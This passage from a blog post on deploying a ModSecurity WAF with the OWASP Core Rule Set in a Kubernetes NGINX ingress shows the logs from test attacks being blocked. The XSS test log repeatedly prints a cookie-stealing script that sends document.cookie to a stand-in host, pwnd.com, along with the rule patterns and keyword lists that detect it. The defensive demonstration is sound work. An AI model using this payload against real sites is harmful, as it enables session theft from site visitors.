          &quot;match&quot;: &quot;Matched \&quot;Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `5' )&quot;,
          &quot;reference&quot;: &quot;&quot;,
          &quot;ruleId&quot;: &quot;949110&quot;,
          &quot;file&quot;: &quot;/etc/nginx/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf&quot;,
          &quot;lineNumber&quot;: &quot;81&quot;,
          &quot;data&quot;: &quot;&quot;,
          &quot;severity&quot;: &quot;2&quot;,
          &quot;ver&quot;: &quot;OWASP_CRS/3.3.4&quot;,
          &quot;rev&quot;: &quot;&quot;,
          &quot;tags&quot;: [
            &quot;application-multi&quot;,
            &quot;language-multi&quot;,
            &quot;platform-multi&quot;,
            &quot;attack-generic&quot;
          ],
          &quot;maturity&quot;: &quot;0&quot;,
          &quot;accuracy&quot;: &quot;0&quot;
        }
      }
    ]
  }
}
</code></pre><p>We can see the request triggered a rule:</p><ul><li>942100: SQL Injection Attack Detected via libinjection</li></ul><p>Causing the scoring limit to be exceeded:</p><ul><li>949110: Inbound Anomaly Score Exceeded (Total Score: 5)</li></ul><h3 id=cross-site-scripting>Cross-site scripting <a href=#cross-site-scripting class=anchor aria-hidden=true>#</a></h3><p>Cross-site scripting (XSS) is a security vulnerability that allows attacker to inject malicious code into web pages
viewed by other users, stealing sensitive information or perform other malicious actions.
<img class="img-fluid lazyload blur-up" srcset="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-comment2_huece6e80804d023640bf7c3e5edc3c666_28071_45cfa2733ba2e6cc306e9cb6d6b46d15.webp 480w, https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-comment2_huece6e80804d023640bf7c3e5edc3c666_28071_647x0_resize_q75_h2_box_3.webp 647w" sizes=80vw src=https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-comment2_huece6e80804d023640bf7c3e5edc3c666_28071_647x0_resize_q75_h2_box_3.webp alt=XSS title=XSS width=647 height=683></p><p><img class="img-fluid lazyload blur-up" srcset="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-result_huc00878d2cc9f9a93f3bf29f98dbe48d2_10383_930ff93c81472deb63082d32a04afdc7.webp 480w, https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-result_huc00878d2cc9f9a93f3bf29f98dbe48d2_10383_502x0_resize_q75_h2_box_3.webp 502w" sizes=80vw src=https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-result_huc00878d2cc9f9a93f3bf29f98dbe48d2_10383_502x0_resize_q75_h2_box_3.webp alt="Bad result" title="Result from bad comment" width=502 height=208></p><h4 id=log-1>Log <a href=#log-1 class=anchor aria-hidden=true>#</a></h4><pre><code class=language-shell>kubectl logs deployment/ingress-nginx-controller
</code></pre><pre><code class=language-json>{
  &quot;transaction&quot;: {
    &quot;client_ip&quot;: &quot;172.17.0.1&quot;,
    &quot;time_stamp&quot;: &quot;Sun Jan 29 00:31:05 2023&quot;,
    &quot;server_id&quot;: &quot;f08c3b1b9631dae9ae3fcc0eb2a796ab80f25776&quot;,
    &quot;client_port&quot;: 42335,
    &quot;host_ip&quot;: &quot;172.17.0.14&quot;,
    &quot;host_port&quot;: 80,
    &quot;unique_id&quot;: &quot;167495226530.605592&quot;,
    &quot;request&quot;: {
      &quot;method&quot;: &quot;POST&quot;,
      &quot;http_version&quot;: 1.1,
      &quot;uri&quot;: &quot;/wp-comments-post.php&quot;,
      &quot;body&quot;: &quot;comment=Great+stuff+Captain%21%0D%0A%3Cscript%3E%0D%0Awindow.location%3D%22http%3A%2F%2Fpwnd.com%3Fcookie%3D%22+%2B+document.cookie%0D%0A%3C%2Fscript%3E&amp;author=jack&amp;email=jack%40mailinator.com&amp;url=jackattack.ca&amp;submit=Post+Comment&amp;comment_post_ID=1&amp;comment_parent=0&quot;,
      &quot;headers&quot;: {
        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,
        &quot;Cache-Control&quot;: &quot;max-age=0&quot;,
        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36&quot;,
        &quot;DNT&quot;: &quot;1&quot;,
        &quot;Origin&quot;: &quot;http://mynewblog.ca&quot;,
        &quot;Referer&quot;: &quot;http://mynewblog.ca/2023/01/24/hello-world/?unapproved=2&amp;moderation-hash=4b3bb66b25ed68730461b027d1e2466e&quot;,
        &quot;Content-Length&quot;: &quot;265&quot;,
        &quot;Connection&quot;: &quot;keep-alive&quot;,
        &quot;Host&quot;: &quot;mynewblog.ca&quot;,
        &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
        &quot;Cookie&quot;: &quot;wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US&quot;,
        &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9&quot;
      }
    },
    &quot;response&quot;: {
      &quot;body&quot;: &quot;&lt;html&gt;\r\n&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;\r\n&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\r\n&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\r\n&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\r\n&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\r\n&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\r\n&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;\r\n&quot;,
      &quot;http_code&quot;: 403,
      &quot;headers&quot;: {
        &quot;Server&quot;: &quot;&quot;,
        &quot;Server&quot;: &quot;&quot;,
        &quot;Date&quot;: &quot;Sun, 29 Jan 2023 00:31:05 GMT&quot;,
        &quot;Content-Length&quot;: &quot;548&quot;,
        &quot;Content-Type&quot;: &quot;text/html&quot;,
        &quot;Connection&quot;: &quot;keep-alive&quot;
      }
    },
    &quot;producer&quot;: {
      &quot;modsecurity&quot;: &quot;ModSecurity v3.0.8 (Linux)&quot;,
      &quot;connector&quot;: &quot;ModSecurity-nginx v1.0.2&quot;,
      &quot;secrules_engine&quot;: &quot;Enabled&quot;,
      &quot;components&quot;: [
        &quot;OWASP_CRS/3.3.4\&quot;&quot;
      ]
    },
    &quot;messages&quot;: [
      {
        &quot;message&quot;: &quot;XSS Attack Detected via libinjection&quot;,
        &quot;details&quot;: {
          &quot;match&quot;: &quot;detected XSS using libinjection.&quot;,
          &quot;reference&quot;: &quot;v755,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls&quot;,
          &quot;ruleId&quot;: &quot;941100&quot;,
          &quot;file&quot;: &quot;/etc/nginx/owasp-modsecurity-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;,
          &quot;lineNumber&quot;: &quot;38&quot;,
          &quot;data&quot;: &quot;Matched Data: XSS data found within ARGS:comment: Great stuff Captain!\r\n&lt;script&gt;\r\nwindow.location=\&quot;http://pwnd.com?cookie=\&quot;   document.cookie\r\n&lt;/script&gt;&quot;,
          &quot;severity&quot;: &quot;2&quot;,
          &quot;ver&quot;: &quot;OWASP_CRS/3.3.4&quot;,
          &quot;rev&quot;: &quot;&quot;,
          &quot;tags&quot;: [
            &quot;application-multi&quot;,
            &quot;language-multi&quot;,
            &quot;platform-multi&quot;,
            &quot;attack-xss&quot;,
            &quot;paranoia-level/1&quot;,
            &quot;OWASP_CRS&quot;,
            &quot;capec/1000/152/242&quot;
          ],
          &quot;maturity&quot;: &quot;0&quot;,
          &quot;accuracy&quot;: &quot;0&quot;
        }
      },
      {
        &quot;message&quot;: &quot;XSS Filter - Category 1: Script Tag Vector&quot;,
        &quot;details&quot;: {
          &quot;match&quot;: &quot;Matched \&quot;Operator `Rx' with parameter `(?i)&lt;script[^&gt;]*&gt;[\\s\\S]*?' against variable `ARGS:comment' (Value: `Great stuff Captain!\\x0d\\x0a&lt;script&gt;\\x0d\\x0awindow.location=\&quot;http://pwnd.com?cookie=\&quot; + document.coo (20 characters omitted)' )&quot;,
          &quot;reference&quot;: &quot;o22,8v755,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls&quot;,
          &quot;ruleId&quot;: &quot;941110&quot;,
          &quot;file&quot;: &quot;/etc/nginx/owasp-modsecurity-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;,
          &quot;lineNumber&quot;: &quot;64&quot;,
          &quot;data&quot;: &quot;Matched Data: &lt;script&gt; found within ARGS:comment: Great stuff Captain!\r\n&lt;script&gt;\r\nwindow.location=\&quot;http://pwnd.com?cookie=\&quot;   document.cookie\r\n&lt;/script&gt;&quot;,
          &quot;severity&quot;: &quot;2&quot;,
          &quot;ver&quot;: &quot;OWASP_CRS/3.3.4&quot;,
          &quot;rev&quot;: &quot;&quot;,
          &quot;tags&quot;: [
            &quot;application-multi&quot;,
            &quot;language-multi&quot;,
            &quot;platform-multi&quot;,
            &quot;attack-xss&quot;,
            &quot;paranoia-level/1&quot;,
            &quot;OWASP_CRS&quot;,
            &quot;capec/1000/152/242&quot;
          ],
          &quot;maturity&quot;: &quot;0&quot;,
          &quot;accuracy&quot;: &quot;0&quot;
        }
      },
      {
        &quot;message&quot;: &quot;NoScript XSS InjectionChecker: HTML Injection&quot;,
        &quot;details&quot;: {
          &quot;match&quot;: &quot;Matched \&quot;Operator `Rx' with parameter `(?i:(?:&lt;\\w[\\s\\S]*[\\s\\/]|['\\\&quot;](?:[\\s\\S]*[\\s\\/])?)(?:on(?:d(?:e(?:vice(?:(?:orienta|mo)tion|proximity|found|light)|livery(?:success|error)|activate)|r(?:ag(?:e(?:n(?:ter|d)|xit)|(?:gestur|leav)e|start|d (3146 characters omitted)' against variable `ARGS:comment' (Value: `Great stuff Captain!\\x0d\\x0a&lt;script&gt;\\x0d\\x0awindow.location=\&quot;http://pwnd.com?cookie=\&quot; + document.coo (20 characters omitted)' )&quot;,
          &quot;reference&quot;: &quot;o22,7v755,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls&quot;,
          &quot;ruleId&quot;: &quot;941160&quot;,
          &quot;file&quot;: &quot;/etc/nginx/owasp-modsecurity-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;,
          &quot;lineNumber&quot;: &quot;181&quot;,
          &quot;data&quot;: &quot;Matched Data: &lt;script found within ARGS:comment: Great stuff Captain!\r\n&lt;script&gt;\r\nwindow.location=\&quot;http://pwnd.com?cookie=\&quot;   document.cookie\r\n&lt;/script&gt;&quot;,
          &quot;severity&quot;: &quot;2&quot;,
          &quot;ver&quot;: &quot;OWASP_CRS/3.3.4&quot;,
          &quot;rev&quot;: &quot;&quot;,
          &quot;tags&quot;: [
            &quot;application-multi&quot;,
            &quot;language-multi&quot;,
            &quot;platform-multi&quot;,
            &quot;attack-xss&quot;,
            &quot;paranoia-level/1&quot;,
            &quot;OWASP_CRS&quot;,
            &quot;capec/1000/152/242&quot;
          ],
          &quot;maturity&quot;: &quot;0&quot;,
          &quot;accuracy&quot;: &quot;0&quot;
        }
      },
      {
        &quot;message&quot;: &quot;Node-Validator Blacklist Keywords&quot;,
        &quot;details&quot;: {
          &quot;match&quot;: &quot;Matched \&quot;Operator `Pm' with parameter `document.cookie document.write .parentnode .innerhtml window.location -moz-binding &lt;!-- --&gt; &lt;![cdata[' against variable `ARGS:comment' (Value: `Great stuff Captain!\\x0d\\x0a&lt;script&gt;\\x0d\\x0awindow.location=\&quot;http://pwnd.com?cookie=\&quot; + document.coo (20 characters omitted)' )&quot;,
          &quot;reference&quot;: &quot;o32,15v755,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls&quot;,
          &quot;ruleId&quot;: &quot;941180&quot;,
          &quot;file&quot;: &quot;/etc/nginx/owasp-modsecurity-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;,
          &quot;lineNumber&quot;: &quot;232&quot;,
          &quot;data&quot;: &quot;Matched Data: window.location found within ARGS:comment: great stuff captain!\r\n&lt;script&gt;\r\nwindow.location=\&quot;http://pwnd.com?cookie=\&quot;   document.cookie\r\n&lt;/script&gt;&quot;,
          &quot;severity&quot;: &quot;2&quot;,
          &quot;ver&quot;: &quot;OWASP_CRS/3.3.4&quot;,
          &quot;rev&quot;: &quot;&quot;,
          &quot;tags&quot;: [
            &quot;application-multi&quot;,
            &quot;language-multi&quot;,
            &quot;platform-multi&quot;,
            &quot;attack-xss&quot;,
            &quot;paranoia-level/1&quot;,
            &quot;OWASP_CRS&quot;,
            &quot;capec/1000/152/242&quot;
          ],
          &quot;maturity&quot;: &quot;0&quot;,
          &quot;accuracy&quot;: &quot;0&quot;
        }
      },
      {
        &quot;message&quot;: &quot;Inbound Anomaly Score Exceeded (Total Score: 20)&quot;,
        &quot;details&quot;: {
          &quot;match&quot;: &quot;Matched \&quot;Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `20' )&quot;,
          &quot;reference&quot;: &quot;&quot;,
          &quot;ruleId&quot;: &quot;949110&quot;,
          &quot;file&quot;: &quot;/etc/nginx/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf&quot;,
          &quot;lineNumber&quot;: &quot;81&quot;,
          &quot;data&quot;: &quot;&quot;,
          &quot;severity&quot;: &quot;2&quot;,
          &quot;ver&quot;: &quot;OWASP_CRS/3.3.4&quot;,
          &quot;rev&quot;: &quot;&quot;,
          &quot;tags&quot;: [
            &quot;application-multi&quot;,
            &quot;language-multi&quot;,
            &quot;platform-multi&quot;,
            &quot;attack-generic&quot;
          ],
          &quot;maturity&quot;: &quot;0&quot;,
          &quot;accuracy&quot;: &quot;0&quot;
        }
      }
    ]
  }
}
</code></pre><p>We can see the request triggered a few rules:</p><ul><li>941100: XSS Attack Detected via libinjection</li><li>941110: XSS Filter - Category 1: Script Tag Vector</li><li>941160: NoScript XSS InjectionChecker: HTML Injection</li><li>941180: Node-Validator Blacklist Keywords</li></ul><p>Ultimately triggering scoring limit:</p><ul><li>949110: Inbound Anomaly Score Exceeded (Total Score: 20)</li></ul><h2 id=modsecurity-scoring-system>ModSecurity Scoring System <a href=#modsecurity-scoring-system class=anchor aria-hidden=true>#</a></h2><p>ModSecurity uses a rule-based system to detect and prevent common web attacks. Each rule is associated with a score,
which is a numeric value that represents the severity of the potential threat. When a request is made to a protected web
application, ModSecurity evaluates the request against its rules and assigns a score for each rule that is triggered.
The scoring limit is a blocking threshold. The scoring limit can be adjusted as needed in the ModSecurity configuration.</p><h2 id=conclusion>Conclusion <a href=#conclusion class=anchor aria-hidden=true>#</a></h2><p>A WAF can provide security from common attacks. From my experience using WAFs there will be a some false positives that
will block valid requests. Using the logs, WAF exclusions can be created to modifying existing rules to exclude certain
types of traffic from being blocked.</p><h2 id=helpful-links>Helpful links <a href=#helpful-links class=anchor aria-hidden=true>#</a></h2><ul><li><a href=https://owasp.org/www-project-modsecurity-core-rule-set/>OWASP ModSecurity Core Rule Set</a></li><li><a href=https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#modsecurity>NGINX Annotations: ModSecurity</a></li><li><a href=https://www.oreilly.com/content/how-to-tune-your-waf-installation-to-reduce-false-positives/>How to tune your WAF installation to reduce false positives</a></li><li><a href=https://systemweakness.com/nginx-ingress-waf-with-modsecurity-from-zero-to-hero-fa284cb6f54a#6f5a>Kubernetes NGINX Ingress WAF with ModSecurity. From zero to hero!</a></li></ul></div></div></article><div class=related-posts><div class="row justify-content-center"><div class=col><h2 class=section-title>Related posts</h2></div></div><div class="row row-cols-1 row-cols-md-2 row-cols-lg-3 g-lg-5"><div class=col><div class=card><img class="card-img-top img-fluid lazyload blur-up" src=https://nickmcgrath.github.io/blog/k8s-creating-multi-cloud-clusters/computers-in-clouds_hu3055a76ed66746ef43778affcb2d2f3e_2086129_377298019b2376153f090dfdb73dab79.webp data-src=https://nickmcgrath.github.io/blog/k8s-creating-multi-cloud-clusters/computers-in-clouds_hu3055a76ed66746ef43778affcb2d2f3e_2086129_1270x620_resize_q75_h2_box_3.webp width=1270 height=620 alt="K8s Creating Multi Cloud Clusters"><div class=card-body><article><h2 class=h3><a class="stretched-link text-body" href=https://nickmcgrath.github.io/blog/k8s-creating-multi-cloud-clusters/>K8s Creating Multi Cloud Clusters</a></h2><p>Exploring options on utilizing resources on multiple vendors using kubernetes</p><p><small>Posted&nbsp;in&nbsp;<a class="stretched-link position-relative link-muted" href=https://nickmcgrath.github.io/categories/kubernetes/>kubernetes</a>, <a class="stretched-link position-relative link-muted" href=https://nickmcgrath.github.io/categories/cloud/>cloud</a>&nbsp;on&nbsp;January 8, 2023 by <a class="stretched-link position-relative" href=https://nickmcgrath.github.io/contributors/nicholas-mcgrath/>Nicholas McGrath</a>&nbsp;&dash;&nbsp;<strong>1&nbsp;min read</strong></small><p></article></div></div></div></div></div></div></div><footer class="footer text-muted"><div class=container-xxl><div class=row><div class="col-lg-8 order-last order-lg-first"><ul class=list-inline><li class=list-inline-item>Powered by <a class=text-muted href=https://www.netlify.com/>Netlify</a>, <a class=text-muted href=https://gohugo.io/>Hugo</a>, and <a class=text-muted href=https://getdoks.org/>Doks</a></li></ul></div><div class="col-lg-8 order-first order-lg-last text-lg-end"><ul class=list-inline></ul></div></div></div></footer><script src=https://nickmcgrath.github.io/js/bootstrap.min.87685cf4e6585276ff9e7b5d0b97e792615af6921e77821315d1ca7c5511ac2f30667e16c0d031e680ca8b57f63f6c0f6c4a232da777cce474b501ed81e090a9.js integrity="sha512-h2hc9OZYUnb/nntdC5fnkmFa9pIed4ITFdHKfFURrC8wZn4WwNAx5oDKi1f2P2wPbEojLad3zOR0tQHtgeCQqQ==" crossorigin=anonymous defer></script>
<script src=https://nickmcgrath.github.io/js/highlight.min.56a414730f1135fe77b5ea30bf74a2cc4101a6f386e85e5b789c800570cc33d33054000f45932c053a59b41018f72687867254a80e1b9710671852492533162f.js integrity="sha512-VqQUcw8RNf53teowv3SizEEBpvOG6F5beJyABXDMM9MwVAAPRZMsBTpZtBAY9yaHhnJUqA4blxBnGFJJJTMWLw==" crossorigin=anonymous defer></script>
<script src=https://nickmcgrath.github.io/main.min.162c56a0426544de0d010e66c56e321579655c400c9aae06a6823e7682de379adadf2165bd416fea191e4e7e410fbf1fd2c35a759aa43ff2e3787067669bf81b.js integrity="sha512-FixWoEJlRN4NAQ5mxW4yFXllXEAMmq4GpoI+doLeN5ra3yFlvUFv6hkeTn5BD78f0sNadZqkP/LjeHBnZpv4Gw==" crossorigin=anonymous defer></script>
<script src=https://nickmcgrath.github.io/js/mermaid.min.0776c55aeddb80a44c1a6d322ccd0e528569fecb3f172a7fcd43b151bc737207bfa749a75cb08db912e86e2de538e5af1848ae8bf73fb3c0bd7841377c6210ef.js integrity="sha512-B3bFWu3bgKRMGm0yLM0OUoVp/ss/Fyp/zUOxUbxzcge/p0mnXLCNuRLobi3lOOWvGEiui/c/s8C9eEE3fGIQ7w==" crossorigin=anonymous defer></script>
<script src=https://nickmcgrath.github.io/index.min.0c084f8ccb13611f8d10a22fa042eac15ee9976316f789e9de9b506fa0f0dd5d3a5acfba720ea57b45371a73db643ec8c1fae4bb2495f19edb374c9888f6fd6c.js integrity="sha512-DAhPjMsTYR+NEKIvoELqwV7pl2MW94np3ptQb6Dw3V06Ws+6cg6le0U3GnPbZD7IwfrkuySV8Z7bN0yYiPb9bA==" crossorigin=anonymous defer></script></body></html>